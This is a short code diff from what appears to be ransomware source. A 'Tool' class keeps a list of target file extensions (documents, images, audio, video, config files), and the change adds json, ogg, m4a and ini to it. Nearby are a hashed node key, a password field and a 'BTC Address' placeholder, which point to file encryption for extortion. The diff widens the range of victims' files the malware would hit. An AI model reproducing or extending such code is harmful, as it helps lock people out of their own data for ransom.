@@ -59,7 +59,9 @@ node_key_hash = hashlib.sha256(node_key.encode()).hexdigest()
 class Tool:
     def __init__(self):
         self.files_found = []
-        self.targets = ["txt", "pdf", "odt", "xls", "png", "jpg", "jpeg", "epub", "mp3", "gif", "doc", "odp", "ods", "mp4", "avi", "md"]
+        self.targets = ["txt", "pdf", "odt", "xls", "png", "jpg", "jpeg",
+                        "epub", "mp3", "gif", "doc", "odp", "ods", "json",
+                        "mp4", "avi", "md", "ogg", "m4a", "ini"]
         self.password_field = "" # For the interface
         self.new_server_address = "BTC Address" # For updates
         self.loop = True
